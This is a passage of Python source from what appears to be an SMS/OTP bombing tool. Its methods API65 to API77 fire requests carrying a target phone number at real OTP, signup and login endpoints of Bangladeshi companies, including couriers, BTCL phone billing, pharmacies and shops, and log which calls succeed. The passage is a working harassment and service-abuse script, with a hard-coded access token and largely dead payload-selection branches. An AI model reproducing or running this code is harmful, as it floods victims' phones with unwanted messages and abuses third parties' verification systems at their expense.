            elif "Robi" in "API65 - Arogga App": payload = {"phone_number": target}
            elif "Arogga" in "API65 - Arogga App": payload = {"mobile": target}
            elif "MyGP" in "API65 - Arogga App": pass
            elif "BDSTall" in "API65 - Arogga App": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API65 - Arogga App": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API65 - Arogga App": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API65 - Arogga App": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API65 - Arogga App": payload = {"phoneNumber": target}
            elif "Sindabad" in "API65 - Arogga App": payload = {"mobile": target}
            elif "Kirei" in "API65 - Arogga App": payload = {"phone": target}
            elif "Shikho" in "API65 - Arogga App": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API65 - Arogga App": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API65 - Arogga App", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API65 - Arogga App", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API65 - Arogga App", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api66_sundarban_courier(self):
        target = self.target
        url = "https://api-gateway.sundarbancourierltd.com/graphql"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API66 - Sundarban Courier": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API66 - Sundarban Courier": pass
            elif "Bioscope" in "API66 - Sundarban Courier": payload = {"number": "+88" + target}
            elif "Proiojon" in "API66 - Sundarban Courier": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API66 - Sundarban Courier": payload = {"phone": target}
            elif "Medha" in "API66 - Sundarban Courier": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API66 - Sundarban Courier": payload = {"number": "+88" + target}
            elif "Robi" in "API66 - Sundarban Courier": payload = {"phone_number": target}
            elif "Arogga" in "API66 - Sundarban Courier": payload = {"mobile": target}
            elif "MyGP" in "API66 - Sundarban Courier": pass
            elif "BDSTall" in "API66 - Sundarban Courier": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API66 - Sundarban Courier": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API66 - Sundarban Courier": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API66 - Sundarban Courier": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API66 - Sundarban Courier": payload = {"phoneNumber": target}
            elif "Sindabad" in "API66 - Sundarban Courier": payload = {"mobile": target}
            elif "Kirei" in "API66 - Sundarban Courier": payload = {"phone": target}
            elif "Shikho" in "API66 - Sundarban Courier": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API66 - Sundarban Courier": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API66 - Sundarban Courier", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API66 - Sundarban Courier", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API66 - Sundarban Courier", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api67_quiztime(self):
        target = self.target
        url = "https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API67 - QuizTime": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API67 - QuizTime": pass
            elif "Bioscope" in "API67 - QuizTime": payload = {"number": "+88" + target}
            elif "Proiojon" in "API67 - QuizTime": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API67 - QuizTime": payload = {"phone": target}
            elif "Medha" in "API67 - QuizTime": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API67 - QuizTime": payload = {"number": "+88" + target}
            elif "Robi" in "API67 - QuizTime": payload = {"phone_number": target}
            elif "Arogga" in "API67 - QuizTime": payload = {"mobile": target}
            elif "MyGP" in "API67 - QuizTime": pass
            elif "BDSTall" in "API67 - QuizTime": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API67 - QuizTime": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API67 - QuizTime": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API67 - QuizTime": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API67 - QuizTime": payload = {"phoneNumber": target}
            elif "Sindabad" in "API67 - QuizTime": payload = {"mobile": target}
            elif "Kirei" in "API67 - QuizTime": payload = {"phone": target}
            elif "Shikho" in "API67 - QuizTime": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API67 - QuizTime": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API67 - QuizTime", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API67 - QuizTime", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API67 - QuizTime", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api68_dressup(self):
        target = self.target
        url = "https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API68 - DressUp": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API68 - DressUp": pass
            elif "Bioscope" in "API68 - DressUp": payload = {"number": "+88" + target}
            elif "Proiojon" in "API68 - DressUp": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API68 - DressUp": payload = {"phone": target}
            elif "Medha" in "API68 - DressUp": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API68 - DressUp": payload = {"number": "+88" + target}
            elif "Robi" in "API68 - DressUp": payload = {"phone_number": target}
            elif "Arogga" in "API68 - DressUp": payload = {"mobile": target}
            elif "MyGP" in "API68 - DressUp": pass
            elif "BDSTall" in "API68 - DressUp": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API68 - DressUp": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API68 - DressUp": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API68 - DressUp": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API68 - DressUp": payload = {"phoneNumber": target}
            elif "Sindabad" in "API68 - DressUp": payload = {"mobile": target}
            elif "Kirei" in "API68 - DressUp": payload = {"phone": target}
            elif "Shikho" in "API68 - DressUp": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API68 - DressUp": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API68 - DressUp", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API68 - DressUp", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API68 - DressUp", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api69_ghoori_learning(self):
        target = self.target
        url = "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API69 - Ghoori Learning": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API69 - Ghoori Learning": pass
            elif "Bioscope" in "API69 - Ghoori Learning": payload = {"number": "+88" + target}
            elif "Proiojon" in "API69 - Ghoori Learning": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API69 - Ghoori Learning": payload = {"phone": target}
            elif "Medha" in "API69 - Ghoori Learning": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API69 - Ghoori Learning": payload = {"number": "+88" + target}
            elif "Robi" in "API69 - Ghoori Learning": payload = {"phone_number": target}
            elif "Arogga" in "API69 - Ghoori Learning": payload = {"mobile": target}
            elif "MyGP" in "API69 - Ghoori Learning": pass
            elif "BDSTall" in "API69 - Ghoori Learning": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API69 - Ghoori Learning": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API69 - Ghoori Learning": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API69 - Ghoori Learning": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API69 - Ghoori Learning": payload = {"phoneNumber": target}
            elif "Sindabad" in "API69 - Ghoori Learning": payload = {"mobile": target}
            elif "Kirei" in "API69 - Ghoori Learning": payload = {"phone": target}
            elif "Shikho" in "API69 - Ghoori Learning": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API69 - Ghoori Learning": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API69 - Ghoori Learning", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API69 - Ghoori Learning", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API69 - Ghoori Learning", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api70_garibook(self):
        target = self.target
        url = "https://api.garibookadmin.com/api/v3/user/login"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API70 - Garibook": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API70 - Garibook": pass
            elif "Bioscope" in "API70 - Garibook": payload = {"number": "+88" + target}
            elif "Proiojon" in "API70 - Garibook": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API70 - Garibook": payload = {"phone": target}
            elif "Medha" in "API70 - Garibook": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API70 - Garibook": payload = {"number": "+88" + target}
            elif "Robi" in "API70 - Garibook": payload = {"phone_number": target}
            elif "Arogga" in "API70 - Garibook": payload = {"mobile": target}
            elif "MyGP" in "API70 - Garibook": pass
            elif "BDSTall" in "API70 - Garibook": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API70 - Garibook": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API70 - Garibook": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API70 - Garibook": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API70 - Garibook": payload = {"phoneNumber": target}
            elif "Sindabad" in "API70 - Garibook": payload = {"mobile": target}
            elif "Kirei" in "API70 - Garibook": payload = {"phone": target}
            elif "Shikho" in "API70 - Garibook": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API70 - Garibook": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API70 - Garibook", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API70 - Garibook", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API70 - Garibook", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api71_fabrilife_signup(self):
        target = self.target
        url = "https://fabrilifess.com/api/wp-json/wc/v2/user/register"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API71 - Fabrilife Signup": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API71 - Fabrilife Signup": pass
            elif "Bioscope" in "API71 - Fabrilife Signup": payload = {"number": "+88" + target}
            elif "Proiojon" in "API71 - Fabrilife Signup": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API71 - Fabrilife Signup": payload = {"phone": target}
            elif "Medha" in "API71 - Fabrilife Signup": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API71 - Fabrilife Signup": payload = {"number": "+88" + target}
            elif "Robi" in "API71 - Fabrilife Signup": payload = {"phone_number": target}
            elif "Arogga" in "API71 - Fabrilife Signup": payload = {"mobile": target}
            elif "MyGP" in "API71 - Fabrilife Signup": pass
            elif "BDSTall" in "API71 - Fabrilife Signup": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API71 - Fabrilife Signup": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API71 - Fabrilife Signup": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API71 - Fabrilife Signup": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API71 - Fabrilife Signup": payload = {"phoneNumber": target}
            elif "Sindabad" in "API71 - Fabrilife Signup": payload = {"mobile": target}
            elif "Kirei" in "API71 - Fabrilife Signup": payload = {"phone": target}
            elif "Shikho" in "API71 - Fabrilife Signup": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API71 - Fabrilife Signup": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API71 - Fabrilife Signup", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API71 - Fabrilife Signup", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API71 - Fabrilife Signup", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api72_fabrilife_otp(self):
        target = self.target
        url = "https://fabrilifess.com/api/wp-json/wc/v2/user/phone-login/{phone}"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API72 - Fabrilife OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API72 - Fabrilife OTP": pass
            elif "Bioscope" in "API72 - Fabrilife OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API72 - Fabrilife OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API72 - Fabrilife OTP": payload = {"phone": target}
            elif "Medha" in "API72 - Fabrilife OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API72 - Fabrilife OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API72 - Fabrilife OTP": payload = {"phone_number": target}
            elif "Arogga" in "API72 - Fabrilife OTP": payload = {"mobile": target}
            elif "MyGP" in "API72 - Fabrilife OTP": pass
            elif "BDSTall" in "API72 - Fabrilife OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API72 - Fabrilife OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API72 - Fabrilife OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API72 - Fabrilife OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API72 - Fabrilife OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API72 - Fabrilife OTP": payload = {"mobile": target}
            elif "Kirei" in "API72 - Fabrilife OTP": payload = {"phone": target}
            elif "Shikho" in "API72 - Fabrilife OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API72 - Fabrilife OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API72 - Fabrilife OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API72 - Fabrilife OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API72 - Fabrilife OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api73_btcl_bdia(self):
        target = self.target
        url = "https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API73 - BTCL BDIA": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API73 - BTCL BDIA": pass
            elif "Bioscope" in "API73 - BTCL BDIA": payload = {"number": "+88" + target}
            elif "Proiojon" in "API73 - BTCL BDIA": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API73 - BTCL BDIA": payload = {"phone": target}
            elif "Medha" in "API73 - BTCL BDIA": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API73 - BTCL BDIA": payload = {"number": "+88" + target}
            elif "Robi" in "API73 - BTCL BDIA": payload = {"phone_number": target}
            elif "Arogga" in "API73 - BTCL BDIA": payload = {"mobile": target}
            elif "MyGP" in "API73 - BTCL BDIA": pass
            elif "BDSTall" in "API73 - BTCL BDIA": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API73 - BTCL BDIA": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API73 - BTCL BDIA": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API73 - BTCL BDIA": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API73 - BTCL BDIA": payload = {"phoneNumber": target}
            elif "Sindabad" in "API73 - BTCL BDIA": payload = {"mobile": target}
            elif "Kirei" in "API73 - BTCL BDIA": payload = {"phone": target}
            elif "Shikho" in "API73 - BTCL BDIA": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API73 - BTCL BDIA": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API73 - BTCL BDIA", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API73 - BTCL BDIA", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API73 - BTCL BDIA", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api74_btcl_phonebill_register(self):
        target = self.target
        url = "https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API74 - BTCL PhoneBill Register": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API74 - BTCL PhoneBill Register": pass
            elif "Bioscope" in "API74 - BTCL PhoneBill Register": payload = {"number": "+88" + target}
            elif "Proiojon" in "API74 - BTCL PhoneBill Register": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API74 - BTCL PhoneBill Register": payload = {"phone": target}
            elif "Medha" in "API74 - BTCL PhoneBill Register": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API74 - BTCL PhoneBill Register": payload = {"number": "+88" + target}
            elif "Robi" in "API74 - BTCL PhoneBill Register": payload = {"phone_number": target}
            elif "Arogga" in "API74 - BTCL PhoneBill Register": payload = {"mobile": target}
            elif "MyGP" in "API74 - BTCL PhoneBill Register": pass
            elif "BDSTall" in "API74 - BTCL PhoneBill Register": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API74 - BTCL PhoneBill Register": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API74 - BTCL PhoneBill Register": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API74 - BTCL PhoneBill Register": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API74 - BTCL PhoneBill Register": payload = {"phoneNumber": target}
            elif "Sindabad" in "API74 - BTCL PhoneBill Register": payload = {"mobile": target}
            elif "Kirei" in "API74 - BTCL PhoneBill Register": payload = {"phone": target}
            elif "Shikho" in "API74 - BTCL PhoneBill Register": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API74 - BTCL PhoneBill Register": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API74 - BTCL PhoneBill Register", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API74 - BTCL PhoneBill Register", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API74 - BTCL PhoneBill Register", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api75_btcl_phonebill_login(self):
        target = self.target
        url = "https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API75 - BTCL PhoneBill Login": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API75 - BTCL PhoneBill Login": pass
            elif "Bioscope" in "API75 - BTCL PhoneBill Login": payload = {"number": "+88" + target}
            elif "Proiojon" in "API75 - BTCL PhoneBill Login": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API75 - BTCL PhoneBill Login": payload = {"phone": target}
            elif "Medha" in "API75 - BTCL PhoneBill Login": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API75 - BTCL PhoneBill Login": payload = {"number": "+88" + target}
            elif "Robi" in "API75 - BTCL PhoneBill Login": payload = {"phone_number": target}
            elif "Arogga" in "API75 - BTCL PhoneBill Login": payload = {"mobile": target}
            elif "MyGP" in "API75 - BTCL PhoneBill Login": pass
            elif "BDSTall" in "API75 - BTCL PhoneBill Login": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API75 - BTCL PhoneBill Login": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API75 - BTCL PhoneBill Login": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API75 - BTCL PhoneBill Login": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API75 - BTCL PhoneBill Login": payload = {"phoneNumber": target}
            elif "Sindabad" in "API75 - BTCL PhoneBill Login": payload = {"mobile": target}
            elif "Kirei" in "API75 - BTCL PhoneBill Login": payload = {"phone": target}
            elif "Shikho" in "API75 - BTCL PhoneBill Login": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API75 - BTCL PhoneBill Login": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API75 - BTCL PhoneBill Login", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API75 - BTCL PhoneBill Login", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API75 - BTCL PhoneBill Login", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api76_redx_merchant_otp(self):
        target = self.target
        url = "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API76 - RedX Merchant OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API76 - RedX Merchant OTP": pass
            elif "Bioscope" in "API76 - RedX Merchant OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API76 - RedX Merchant OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API76 - RedX Merchant OTP": payload = {"phone": target}
            elif "Medha" in "API76 - RedX Merchant OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API76 - RedX Merchant OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API76 - RedX Merchant OTP": payload = {"phone_number": target}
            elif "Arogga" in "API76 - RedX Merchant OTP": payload = {"mobile": target}
            elif "MyGP" in "API76 - RedX Merchant OTP": pass
            elif "BDSTall" in "API76 - RedX Merchant OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API76 - RedX Merchant OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API76 - RedX Merchant OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API76 - RedX Merchant OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API76 - RedX Merchant OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API76 - RedX Merchant OTP": payload = {"mobile": target}
            elif "Kirei" in "API76 - RedX Merchant OTP": payload = {"phone": target}
            elif "Shikho" in "API76 - RedX Merchant OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API76 - RedX Merchant OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API76 - RedX Merchant OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API76 - RedX Merchant OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API76 - RedX Merchant OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api77_khaasfood_digits_otp(self):
        target = self.target
        url = "https://www.khaasfood.com/wp-admin/admin-ajax.php"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API77 - KhaasFood Digits OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API77 - KhaasFood Digits OTP": pass
            elif "Bioscope" in "API77 - KhaasFood Digits OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API77 - KhaasFood Digits OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API77 - KhaasFood Digits OTP": payload = {"phone": target}
            elif "Medha" in "API77 - KhaasFood Digits OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API77 - KhaasFood Digits OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API77 - KhaasFood Digits OTP": payload = {"phone_number": target}
            elif "Arogga" in "API77 - KhaasFood Digits OTP": payload = {"mobile": target}
            elif "MyGP" in "API77 - KhaasFood Digits OTP": pass
